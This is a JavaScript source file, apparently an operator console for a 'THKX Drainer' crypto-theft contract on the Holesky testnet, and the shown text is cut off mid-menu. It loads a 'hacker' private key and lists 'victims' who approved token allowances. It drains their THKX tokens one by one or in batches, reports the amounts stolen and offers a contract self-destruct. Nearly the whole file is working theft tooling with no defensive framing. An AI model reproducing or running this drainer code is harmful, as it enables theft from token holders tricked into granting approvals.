require('dotenv').config();
const { ethers } = require("ethers");
const readline = require("readline");

const rpcUrl = process.env.ETHEREUM_HOLESKY_ENDPOINT;
const contractAddress = process.env.THKXDrainer;
const privateKey = process.env.HACKER_PRIVATE_KEY;

const CONFIG = {
    MAX_RETRIES: 3,
    RETRY_DELAY: 10000,
    BATCH_SIZE: 5,
    GAS_LIMIT_MULTIPLIER: 1.2,
    MIN_BALANCE_THRESHOLD: ethers.parseEther("0.001"),
    MAX_GAS_PRICE: ethers.parseUnits("100", "gwei"),
    CONFIRMATION_BLOCKS: 3,
    OPERATION_DELAY: 3000,
    BATCH_DELAY: 5000,
    BALANCE_CHECK_DELAY: 2000,
    LOG_COLORS: {
        reset: "\x1b[0m",
        bright: "\x1b[1m",
        dim: "\x1b[2m",
        red: "\x1b[31m",
        green: "\x1b[32m",
        yellow: "\x1b[33m",
        blue: "\x1b[34m",
        magenta: "\x1b[35m",
        cyan: "\x1b[36m",
        white: "\x1b[37m"
    }
};

const provider = new ethers.JsonRpcProvider(rpcUrl);
const wallet = new ethers.Wallet(privateKey, provider);

const abi = [
    "function drainAllVictims()",
    "function drainVictim(address victim) public",
    "function destroyNow()",
    "function victimCount() view returns (uint256)",
    "function getVictimBalance(address victim) view returns (uint256)",
    "function getVictimList() view returns (address[] memory)",
    "function thkxToken() view returns (address)",
    "function drainedAmount(address) view returns (uint256)",
    "function isPaused() view returns (bool)",
    "function isDestroyed() view returns (bool)",
    "function resetVictimDrainedAmount(address victim) external",
    "event TokensDrained(address indexed victim, uint256 amount)",
    "event DrainFailed(address indexed victim, uint256 amount, string reason)",
    "event VictimReset(address indexed victim)"
];

const contract = new ethers.Contract(contractAddress, abi, wallet);

const asciiArt = `
████████╗██╗  ██╗██╗  ██╗██╗  ██╗    ██████╗ ██████╗  █████╗ ██╗███╗   ██╗███╗   ██╗███████╗██████╗ 
╚══██╔══╝██║  ██║██║ ██╔╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║████╗  ██║██╔════╝██╔══██╗
   ██║   ███████║█████╔╝ █████╔╝     ██║  ██║██████╔╝███████║██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
   ██║   ██╔══██║██╔═██╗ ██╔═██╗     ██║  ██║██╔══██╗██╔══██║██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
   ██║   ██║  ██║██║  ██║██║  ██║     ██████╔╝██║  ██║██║  ██║██║██║ ╚████║██║ ╚████║███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝


                                            by ThemeHackers

   `;

const loadingSpinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
let spinnerInterval;

function startSpinner(message) {
    let i = 0;
    spinnerInterval = setInterval(() => {
        process.stdout.write(`\r${loadingSpinner[i]} ${message}`);
        i = (i + 1) % loadingSpinner.length;
    }, 100);
}

function stopSpinner() {
    clearInterval(spinnerInterval);
    process.stdout.write('\r');
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function getOptimalGasPrice() {
    try {
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice;
        return gasPrice > CONFIG.MAX_GAS_PRICE ? CONFIG.MAX_GAS_PRICE : gasPrice;
    } catch (err) {
        console.error("❌ Failed to get gas price:", err.message);
        return CONFIG.MAX_GAS_PRICE;
    }
}

async function displaySystemInfo() {
    try {
        const [network, blockNumber, gasPrice, balance] = await Promise.all([
            provider.getNetwork(),
            provider.getBlockNumber(),
            provider.getFeeData(),
            provider.getBalance(wallet.address)
        ]);

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🌐 System Information:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Network: " + CONFIG.LOG_COLORS.yellow + network.name + CONFIG.LOG_COLORS.reset);
        console.log("├─ Chain ID: " + CONFIG.LOG_COLORS.yellow + network.chainId + CONFIG.LOG_COLORS.reset);
        console.log("├─ Block Number: " + CONFIG.LOG_COLORS.yellow + blockNumber + CONFIG.LOG_COLORS.reset);
        console.log("├─ Gas Price: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(gasPrice.gasPrice, "gwei") + " gwei" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Hacker Balance: " + CONFIG.LOG_COLORS.yellow + ethers.formatEther(balance) + " ETH" + CONFIG.LOG_COLORS.reset);
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to fetch system information: " + err.message + CONFIG.LOG_COLORS.reset);
    }
}

async function displayContractStatus() {
    try {
        const [isPaused, isDestroyed, victimCount] = await Promise.all([
            contract.isPaused(),
            contract.isDestroyed(),
            contract.victimCount()
        ]);

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "📊 Contract Status:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Contract Address: " + CONFIG.LOG_COLORS.yellow + contractAddress + CONFIG.LOG_COLORS.reset);
        console.log("├─ Paused: " + (isPaused ? CONFIG.LOG_COLORS.red + "Yes" : CONFIG.LOG_COLORS.green + "No") + CONFIG.LOG_COLORS.reset);
        console.log("├─ Destroyed: " + (isDestroyed ? CONFIG.LOG_COLORS.red + "Yes" : CONFIG.LOG_COLORS.green + "No") + CONFIG.LOG_COLORS.reset);
        console.log("└─ Total Victims: " + CONFIG.LOG_COLORS.yellow + victimCount.toString() + CONFIG.LOG_COLORS.reset);
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to fetch contract status: " + err.message + CONFIG.LOG_COLORS.reset);
    }
}

async function verifyTransaction(tx, operation) {
    try {
        console.log(CONFIG.LOG_COLORS.cyan + "\n🔄 Transaction Pending:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Hash: " + CONFIG.LOG_COLORS.yellow + tx.hash + CONFIG.LOG_COLORS.reset);

        const receipt = await tx.wait(CONFIG.CONFIRMATION_BLOCKS);
        const gasUsed = receipt.gasUsed;
        const gasPrice = receipt.effectiveGasPrice || receipt.gasPrice;
        const totalGasCost = gasUsed * gasPrice;

        console.log(CONFIG.LOG_COLORS.green + "\n✅ Transaction Confirmed:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Operation: " + CONFIG.LOG_COLORS.yellow + operation + CONFIG.LOG_COLORS.reset);
        console.log("├─ Block: " + CONFIG.LOG_COLORS.yellow + receipt.blockNumber + CONFIG.LOG_COLORS.reset);
        console.log("├─ Gas Used: " + CONFIG.LOG_COLORS.yellow + gasUsed.toString() + CONFIG.LOG_COLORS.reset);
        console.log("├─ Gas Price: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(gasPrice, "gwei") + " gwei" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Total Cost: " + CONFIG.LOG_COLORS.yellow + ethers.formatEther(totalGasCost) + " ETH" + CONFIG.LOG_COLORS.reset);

        receipt.logs.forEach(log => {
            try {
                const parsedLog = contract.interface.parseLog(log);
                if (parsedLog.name === "TokensDrained") {
                    console.log(CONFIG.LOG_COLORS.green + "\n🎯 Event - TokensDrained:" + CONFIG.LOG_COLORS.reset);
                    console.log("├─ Victim: " + CONFIG.LOG_COLORS.yellow + parsedLog.args.victim + CONFIG.LOG_COLORS.reset);
                    console.log("└─ Amount: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(parsedLog.args.amount, 18) + " THKX" + CONFIG.LOG_COLORS.reset);
                } else if (parsedLog.name === "DrainFailed") {
                    console.log(CONFIG.LOG_COLORS.red + "\n❌ Event - DrainFailed:" + CONFIG.LOG_COLORS.reset);
                    console.log("├─ Victim: " + CONFIG.LOG_COLORS.yellow + parsedLog.args.victim + CONFIG.LOG_COLORS.reset);
                    console.log("├─ Amount: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(parsedLog.args.amount, 18) + " THKX" + CONFIG.LOG_COLORS.reset);
                    console.log("└─ Reason: " + CONFIG.LOG_COLORS.yellow + parsedLog.args.reason + CONFIG.LOG_COLORS.reset);
                }
            } catch (e) {
               
            }
        });

        return receipt.status === 1;
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Transaction Failed: " + err.message + CONFIG.LOG_COLORS.reset);
        return false;
    }
}

async function checkTHKXBalance(victim) {
    try {
        const thkxTokenAddress = await contract.thkxToken();
        const thkxContract = new ethers.Contract(thkxTokenAddress, [
            "function balanceOf(address) view returns (uint256)",
            "function allowance(address,address) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)"
        ], wallet);

        const [balance, allowance, decimals, symbol] = await Promise.all([
            thkxContract.balanceOf(victim),
            thkxContract.allowance(victim, contractAddress),
            thkxContract.decimals(),
            thkxContract.symbol()
        ]);

        const formattedBalance = ethers.formatUnits(balance, decimals);
        const formattedAllowance = ethers.formatUnits(allowance, decimals);

        return {
            balance,
            allowance,
            formattedBalance,
            formattedAllowance,
            symbol,
            decimals,
            thkxContract 
        };
    } catch (err) {
        console.error(`❌ Failed to check THKX balance: ${err.message}`);
        return {
            balance: ethers.parseEther("0"),
            allowance: ethers.parseEther("0"),
            formattedBalance: "0",
            formattedAllowance: "0",
            symbol: "THKX",
            decimals: 18,
            thkxContract: null
        };
    }
}

async function processVictimBatch(victims) {
    const results = {
        success: 0,
        failed: 0,
        totalDrained: ethers.parseEther("0")
    };

    const thkxTokenAddress = await contract.thkxToken();
    const thkxContract = new ethers.Contract(thkxTokenAddress, ["function balanceOf(address) view returns (uint256)"], provider);

    console.log("Hacker Address:", wallet.address);

    for (let i = 0; i < victims.length; i += CONFIG.BATCH_SIZE) {
        const batch = victims.slice(i, i + CONFIG.BATCH_SIZE);
        console.log(`\n📊 Processing batch ${Math.floor(i / CONFIG.BATCH_SIZE) + 1}/${Math.ceil(victims.length / CONFIG.BATCH_SIZE)}`);

        for (const victim of batch) {
            try {
                startSpinner(`Checking THKX balance and allowance for ${victim}...`);
                const thkxInfo = await checkTHKXBalance(victim);
                stopSpinner();

                console.log(`\n📊 Victim ${victim} THKX Info:`);
                console.log(`├─ Balance: ${thkxInfo.formattedBalance} ${thkxInfo.symbol}`);
                console.log(`└─ Allowance: ${thkxInfo.formattedAllowance} ${thkxInfo.symbol}`);

                if (thkxInfo.balance < CONFIG.MIN_BALANCE_THRESHOLD) {
                    console.log(`\n⚠️ Victim ${victim} has insufficient balance`);
                    results.failed++;
                    await sleep(CONFIG.BALANCE_CHECK_DELAY);
                    continue;
                }

                const hackerBalanceBefore = await thkxContract.balanceOf(wallet.address);
                console.log(`Hacker Balance Before: ${ethers.formatUnits(hackerBalanceBefore, thkxInfo.decimals)} ${thkxInfo.symbol}`);

                const gasPrice = await getOptimalGasPrice();
                startSpinner(`Initiating drain operation for ${victim}...`);
                const tx = await contract.drainVictim(victim, { gasPrice, gasLimit: 200000 });
                stopSpinner();

                console.log(`\n🧪 Drain transaction sent for ${victim}: ${tx.hash}`);

                startSpinner(`Verifying drain transaction for ${victim}...`);
                const success = await verifyTransaction(tx, `Drain Victim ${victim}`);
                stopSpinner();

                if (success) {
                    const drainedAmount = await contract.drainedAmount(victim);
                    const hackerBalanceAfter = await thkxContract.balanceOf(wallet.address);

                    console.log(`Hacker Balance After: ${ethers.formatUnits(hackerBalanceAfter, thkxInfo.decimals)} ${thkxInfo.symbol}`);
                    console.log(`Drained Amount Reported: ${ethers.formatUnits(drainedAmount, thkxInfo.decimals)} ${thkxInfo.symbol}`);

                    if (drainedAmount > 0n) { 
                        results.totalDrained = results.totalDrained + drainedAmount;
                        results.success++;
                        console.log(`\n✅ Successfully drained ${ethers.formatUnits(drainedAmount, thkxInfo.decimals)} ${thkxInfo.symbol} from ${victim}`);
                    } else {
                        console.log(`\n⚠️ Transaction succeeded but no THKX drained`);
                        results.failed++;
                    }
                } else {
                    results.failed++;
                    console.log(`\n❌ Drain failed for ${victim}`);
                }
            } catch (err) {
                stopSpinner();
                console.error(`\n❌ Failed to process ${victim}: ${err.message}`);
                results.failed++;
            }

            await sleep(CONFIG.OPERATION_DELAY);
        }
    }

    return results;
}

async function updateAllowanceIfNeeded(victim) {
    try {
        const thkxInfo = await checkTHKXBalance(victim);

        if (thkxInfo.balance > thkxInfo.allowance) {
            console.log(`\n📝 Updating allowance for ${victim} to match balance...`);
            const gasPrice = await getOptimalGasPrice();
            const tx = await thkxInfo.thkxContract.approve(contractAddress, thkxInfo.balance, { gasPrice });
            console.log(`✔️ Allowance update transaction sent: ${tx.hash}`);
            await verifyTransaction(tx, `Update Allowance for ${victim}`);
            console.log(`✅ Allowance updated successfully for ${victim}`);
        } else {
            console.log(`\n✅ Victim ${victim} allowance is already sufficient`);
        }
    } catch (err) {
        console.error(`❌ Failed to update allowance for ${victim}: ${err.message}`);
    }
}

async function getVictimList() {
    try {
        const victims = await contract.getVictimList();
        return victims;
    } catch (err) {
        console.error(`❌ Failed to get victim list: ${err.message}`);
        return [];
    }
}

async function processSpecificVictim(victim) {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🎯 Processing Specific Victim:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Address: " + CONFIG.LOG_COLORS.yellow + victim + CONFIG.LOG_COLORS.reset);

        startSpinner("Checking THKX balance and allowance...");
        const thkxInfo = await checkTHKXBalance(victim);
        stopSpinner();

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "💰 Victim THKX Info:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Balance: " + CONFIG.LOG_COLORS.yellow + thkxInfo.formattedBalance + " " + thkxInfo.symbol + CONFIG.LOG_COLORS.reset);
        console.log("└─ Allowance: " + CONFIG.LOG_COLORS.yellow + thkxInfo.formattedAllowance + " " + thkxInfo.symbol + CONFIG.LOG_COLORS.reset);

        if (thkxInfo.balance < CONFIG.MIN_BALANCE_THRESHOLD) {
            console.log(CONFIG.LOG_COLORS.red + "\n⚠️ Victim has insufficient balance" + CONFIG.LOG_COLORS.reset);
            return {
                success: 0,
                failed: 1,
                totalDrained: ethers.parseEther("0")
            };
        }

        const gasPrice = await getOptimalGasPrice();
        startSpinner("Initiating drain operation...");
        const tx = await contract.drainVictim(victim, { gasPrice, gasLimit: 200000 });
        stopSpinner();

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔄 Drain transaction sent:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Hash: " + CONFIG.LOG_COLORS.yellow + tx.hash + CONFIG.LOG_COLORS.reset);

        startSpinner("Verifying transaction...");
        const success = await verifyTransaction(tx, `Drain Victim ${victim}`);
        stopSpinner();

        if (success) {
            const drainedAmount = await contract.drainedAmount(victim);
            if (drainedAmount > 0n) {
                return {
                    success: 1,
                    failed: 0,
                    totalDrained: drainedAmount
                };
            }
        }

        return {
            success: 0,
            failed: 1,
            totalDrained: ethers.parseEther("0")
        };

    } catch (err) {
        stopSpinner();
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to process victim: " + err.message + CONFIG.LOG_COLORS.reset);
        return {
            success: 0,
            failed: 1,
            totalDrained: ethers.parseEther("0")
        };
    }
}

async function validateAddress(address) {
    try {
        return ethers.isAddress(address);
    } catch {
        return false;
    }
}

async function checkRPCConnection() {
    try {
        console.log(CONFIG.LOG_COLORS.cyan + "\n✅ Checking RPC Connection..." + CONFIG.LOG_COLORS.reset);
        
      
        await provider.getNetwork();
        

        const [blockNumber, gasPrice] = await Promise.all([
            provider.getBlockNumber(),
            provider.getFeeData()
        ]);

        console.log(CONFIG.LOG_COLORS.green + "✅ RPC Connection Successful:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ RPC URL: " + CONFIG.LOG_COLORS.yellow + rpcUrl + CONFIG.LOG_COLORS.reset);
        console.log("├─ Latest Block: " + CONFIG.LOG_COLORS.yellow + blockNumber + CONFIG.LOG_COLORS.reset);
        console.log("└─ Gas Price: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(gasPrice.gasPrice, "gwei") + " gwei" + CONFIG.LOG_COLORS.reset);
        
        return true;
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "\n❌ RPC Connection Failed:" + CONFIG.LOG_COLORS.reset);
        console.error("├─ RPC URL: " + CONFIG.LOG_COLORS.yellow + rpcUrl + CONFIG.LOG_COLORS.reset);
        console.error("├─ Error: " + CONFIG.LOG_COLORS.red + err.message + CONFIG.LOG_COLORS.reset);
        console.error("└─ Please check your RPC URL in the .env file" + CONFIG.LOG_COLORS.reset);
        
  
        console.log(CONFIG.LOG_COLORS.cyan + "\n💡 Suggested RPC URLs:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Holesky: https://ethereum-holesky.publicnode.com");
        console.log("├─ Sepolia: https://eth-sepolia.g.alchemy.com/v2/YOUR-API-KEY");
        console.log("├─ Goerli: https://eth-goerli.g.alchemy.com/v2/YOUR-API-KEY");
        console.log("└─ Mainnet: https://eth-mainnet.g.alchemy.com/v2/YOUR-API-KEY");
        
        return false;
    }
}

async function initializeProvider() {
    let retryCount = 0;
    const maxRetries = 3;
    const retryDelay = 2000; 

    while (retryCount < maxRetries) {
        if (await checkRPCConnection()) {
            return true;
        }
        
        retryCount++;
        if (retryCount < maxRetries) {
            console.log(CONFIG.LOG_COLORS.yellow + `\n🔄 Retrying connection (${retryCount}/${maxRetries})...` + CONFIG.LOG_COLORS.reset);
            await sleep(retryDelay);
        }
    }

    return false;
}

async function checkVictimBalance(victim) {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔍 Checking Victim Balance:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Address: " + CONFIG.LOG_COLORS.yellow + victim + CONFIG.LOG_COLORS.reset);

        const balance = await contract.getVictimBalance(victim);
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "💰 Balance Information:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Raw Balance: " + CONFIG.LOG_COLORS.yellow + balance.toString() + CONFIG.LOG_COLORS.reset);
        console.log("└─ Formatted Balance: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(balance, 18) + " THKX" + CONFIG.LOG_COLORS.reset);

        return balance;
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to check victim balance: " + err.message + CONFIG.LOG_COLORS.reset);
        return ethers.parseEther("0");
    }
}

async function checkDrainedAmount(victim) {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "📊 Checking Drained Amount:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Address: " + CONFIG.LOG_COLORS.yellow + victim + CONFIG.LOG_COLORS.reset);

        const amount = await contract.drainedAmount(victim);
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "💸 Drain Information:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Raw Amount: " + CONFIG.LOG_COLORS.yellow + amount.toString() + CONFIG.LOG_COLORS.reset);
        console.log("└─ Formatted Amount: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(amount, 18) + " THKX" + CONFIG.LOG_COLORS.reset);

        return amount;
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to check drained amount: " + err.message + CONFIG.LOG_COLORS.reset);
        return ethers.parseEther("0");
    }
}

async function getTHKXTokenInfo() {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔍 Getting THKX Token Information:" + CONFIG.LOG_COLORS.reset);
        
        const tokenAddress = await contract.thkxToken();
        const thkxContract = new ethers.Contract(tokenAddress, [
            "function name() view returns (string)",
            "function symbol() view returns (string)",
            "function decimals() view returns (uint8)",
            "function totalSupply() view returns (uint256)"
        ], wallet);

        const [name, symbol, decimals, totalSupply] = await Promise.all([
            thkxContract.name().catch(() => "THKX Token"),
            thkxContract.symbol().catch(() => "THKX"),
            thkxContract.decimals().catch(() => 18),
            thkxContract.totalSupply().catch(() => ethers.parseEther("0"))
        ]);

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "📝 Token Details:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Address: " + CONFIG.LOG_COLORS.yellow + tokenAddress + CONFIG.LOG_COLORS.reset);
        console.log("├─ Name: " + CONFIG.LOG_COLORS.yellow + name + CONFIG.LOG_COLORS.reset);
        console.log("├─ Symbol: " + CONFIG.LOG_COLORS.yellow + symbol + CONFIG.LOG_COLORS.reset);
        console.log("├─ Decimals: " + CONFIG.LOG_COLORS.yellow + decimals + CONFIG.LOG_COLORS.reset);
        console.log("└─ Total Supply: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(totalSupply, decimals) + " " + symbol + CONFIG.LOG_COLORS.reset);

        return { tokenAddress, name, symbol, decimals, totalSupply };
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to get token information: " + err.message + CONFIG.LOG_COLORS.reset);
        return null;
    }
}

async function displayVictimList() {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "📋 Getting Victim List:" + CONFIG.LOG_COLORS.reset);
        
        const victims = await contract.getVictimList();
        const count = await contract.victimCount();
        
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "👥 Victim Information:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Total Count: " + CONFIG.LOG_COLORS.yellow + count.toString() + CONFIG.LOG_COLORS.reset);
        
        if (victims.length > 0) {
            console.log("\n" + CONFIG.LOG_COLORS.cyan + "📜 Victim Addresses:" + CONFIG.LOG_COLORS.reset);
            for (let i = 0; i < victims.length; i++) {
                const balance = await contract.getVictimBalance(victims[i]);
                const drained = await contract.drainedAmount(victims[i]);
                console.log(`${i + 1}. ` + CONFIG.LOG_COLORS.yellow + victims[i] + CONFIG.LOG_COLORS.reset);
                console.log("   ├─ Allowance: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(balance, 18) + " THKX" + CONFIG.LOG_COLORS.reset);
                console.log("   └─ Drained: " + CONFIG.LOG_COLORS.yellow + ethers.formatUnits(drained, 18) + " THKX" + CONFIG.LOG_COLORS.reset);
            }
        } else {
            console.log("\n" + CONFIG.LOG_COLORS.yellow + "No victims found in the list." + CONFIG.LOG_COLORS.reset);
        }

        return victims;
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to display victim list: " + err.message + CONFIG.LOG_COLORS.reset);
        return [];
    }
}

async function checkContractHealth() {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🏥 Checking Contract Health:" + CONFIG.LOG_COLORS.reset);
        
        const [isPaused, isDestroyed, victimCount, thkxToken] = await Promise.all([
            contract.isPaused(),
            contract.isDestroyed(),
            contract.victimCount(),
            contract.thkxToken()
        ]);

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "📊 Contract Status:" + CONFIG.LOG_COLORS.reset);
        console.log("├─ Address: " + CONFIG.LOG_COLORS.yellow + contract.target + CONFIG.LOG_COLORS.reset);
        console.log("├─ THKX Token: " + CONFIG.LOG_COLORS.yellow + thkxToken + CONFIG.LOG_COLORS.reset);
        console.log("├─ Paused: " + (isPaused ? CONFIG.LOG_COLORS.red + "Yes ⚠️" : CONFIG.LOG_COLORS.green + "No ✅") + CONFIG.LOG_COLORS.reset);
        console.log("├─ Destroyed: " + (isDestroyed ? CONFIG.LOG_COLORS.red + "Yes ⚠️" : CONFIG.LOG_COLORS.green + "No ✅") + CONFIG.LOG_COLORS.reset);
        console.log("└─ Victim Count: " + CONFIG.LOG_COLORS.yellow + victimCount.toString() + CONFIG.LOG_COLORS.reset);

        return {
            isPaused,
            isDestroyed,
            victimCount: victimCount.toString(),
            thkxToken
        };
    } catch (err) {
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to check contract health: " + err.message + CONFIG.LOG_COLORS.reset);
        return null;
    }
}

async function resetVictimDrainedAmount(victim) {
    try {
        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔄 Resetting Victim Drained Amount:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Address: " + CONFIG.LOG_COLORS.yellow + victim + CONFIG.LOG_COLORS.reset);

        const gasPrice = await getOptimalGasPrice();
        startSpinner("Sending reset transaction...");
        const tx = await contract.resetVictimDrainedAmount(victim, { gasPrice });
        stopSpinner();

        console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔄 Reset transaction sent:" + CONFIG.LOG_COLORS.reset);
        console.log("└─ Hash: " + CONFIG.LOG_COLORS.yellow + tx.hash + CONFIG.LOG_COLORS.reset);

        startSpinner("Verifying transaction...");
        const success = await verifyTransaction(tx, `Reset Victim ${victim}`);
        stopSpinner();

        if (success) {
            console.log(CONFIG.LOG_COLORS.green + "\n✅ Successfully reset victim's drained amount" + CONFIG.LOG_COLORS.reset);
            return true;
        }

        return false;
    } catch (err) {
        stopSpinner();
        console.error(CONFIG.LOG_COLORS.red + "❌ Failed to reset victim: " + err.message + CONFIG.LOG_COLORS.reset);
        return false;
    }
}

async function showMenu() {
    console.clear();
    console.log(CONFIG.LOG_COLORS.magenta + asciiArt + CONFIG.LOG_COLORS.reset);
    
   
    
    if (!await initializeProvider()) {
        console.log(CONFIG.LOG_COLORS.red + "\n❌ Cannot proceed without RPC connection." + CONFIG.LOG_COLORS.reset);
        console.log(CONFIG.LOG_COLORS.cyan + "\n🔧 Available Actions:" + CONFIG.LOG_COLORS.reset);
        console.log("1. " + CONFIG.LOG_COLORS.yellow + "Retry Connection" + CONFIG.LOG_COLORS.reset);
        console.log("2. " + CONFIG.LOG_COLORS.red + "Exit" + CONFIG.LOG_COLORS.reset);

        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        rl.question("\n" + CONFIG.LOG_COLORS.cyan + "Enter choice (1/2): " + CONFIG.LOG_COLORS.reset, async (choice) => {
            rl.close();
            switch (choice) {
                case "1":
                    await sleep(1000);
                    showMenu();
                    break;
                case "2":
                    console.log("\n👋 Exiting...");
                    process.exit(1);
                    break;
                default:
                    console.log("\n❌ Invalid choice. Try again.");
                    await sleep(2000);
                    showMenu();
                    break;
            }
        });
        return;
    }

    
    await displaySystemInfo();
    await displayContractStatus();

    console.log("\n" + CONFIG.LOG_COLORS.cyan + "🔧 Available Actions:" + CONFIG.LOG_COLORS.reset);
    console.log("1. " + CONFIG.LOG_COLORS.green + "Drain All Victims" + CONFIG.LOG_COLORS.reset);
    console.log("2. " + CONFIG.LOG_COLORS.blue + "Drain Specific Victim" + CONFIG.LOG_COLORS.reset);
    console.log("3. " + CONFIG.LOG_COLORS.red + "Destroy Contract" + CONFIG.LOG_COLORS.reset);
    console.log("4. " + CONFIG.LOG_COLORS.cyan + "Get THKX Token Info" + CONFIG.LOG_COLORS.reset);
    console.log("5. " + CONFIG.LOG_COLORS.blue + "Display Victim List" + CONFIG.LOG_COLORS.reset);
    console.log("6. " + CONFIG.LOG_COLORS.green + "Check Contract Health" + CONFIG.LOG_COLORS.reset);
    console.log("7. " + CONFIG.LOG_COLORS.yellow + "Reset Victim Drained Amount" + CONFIG.LOG_COLORS.reset);
    console.log("8. " + CONFIG.LOG_COLORS.red + "Exit" + CONFIG.LOG_COLORS.reset);

    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question("\n" + CONFIG.LOG_COLORS.cyan + "Enter choice (1-8): " + CONFIG.LOG_COLORS.reset, async (choice) => {
        rl.close();
        switch (choice) {
            case "1":
                const victims = await getVictimList();
                if (victims.length === 0) {
                    console.log("\n❌ No victims found to drain.");
                    await sleep(2000);
                    showMenu();
                } else {
                    const results = await processVictimBatch(victims);
                    console.log("\n📊 Summary:");
                    console.log(`├─ Success: ${results.success} victims drained`);
                    console.log(`├─ Failed: ${results.failed} victims`);
                    console.log(`└─ Total Drained: ${ethers.formatUnits(results.totalDrained, 18)} THKX`);
                    await sleep(5000);
                    showMenu();
                }
                break;

            case "2":
                const rlAddress = readline.createInterface({
                    input: process.stdin,
                    output: process.stdout
                });

                rlAddress.question("\n" + CONFIG.LOG_COLORS.cyan + "Enter victim's address: " + CONFIG.LOG_COLORS.reset, async (address) => {
                    rlAddress.close();
                    
                    if (!validateAddress(address)) {
                        console.log(CONFIG.LOG_COLORS.red + "\n❌ Invalid Ethereum address format" + CONFIG.LOG_COLORS.reset);
                        await sleep(2000);
                        showMenu();
                        return;
                    }

                    const result = await processSpecificVictim(address);
                    console.log("\n📊 Summary:");
                    console.log(`├─ Success: ${result.success} victim drained`);
                    console.log(`├─ Failed: ${result.failed} victim`);
                    console.log(`└─ Total Drained: ${ethers.formatUnits(result.totalDrained, 18)} THKX`);
                    await sleep(5000);
                    showMenu();
                });
                break;

            case "3":
                try {
                    const gasPrice = await getOptimalGasPrice();
                    startSpinner("Sending destroy transaction...");
                    const tx = await contract.destroyNow({ gasPrice });
                    stopSpinner();
                    console.log(`\n🚨 Destroy transaction sent: ${tx.hash}`);
                    await verifyTransaction(tx, "Destroy Contract");
                    console.log(`✅ Contract destroyed successfully`);
                } catch (err) {
                    stopSpinner();
                    console.error(`❌ Failed to destroy contract: ${err.message}`);
                }
                await sleep(5000);
                showMenu();
                break;

            case "4":
                await getTHKXTokenInfo();
                await sleep(5000);
                showMenu();
                break;

            case "5":
                await displayVictimList();
                await sleep(5000);
                showMenu();
                break;

            case "6":
                await checkContractHealth();
                await sleep(5000);
                showMenu();
                break;

            case "7":
                const rlReset = readline.createInterface({
                    input: process.stdin,
                    output: process.stdout
                });

                rlReset.question("\n" + CONFIG.LOG_COLORS.cyan + "Enter victim's address to reset: " + CONFIG.LOG_COLORS.reset, async (address) => {
                    rlReset.close();
                    
                    if (!validateAddress(address)) {
                        console.log(CONFIG.LOG_COLORS.red + "\n❌ Invalid Ethereum address format" + CONFIG.LOG_COLORS.reset);
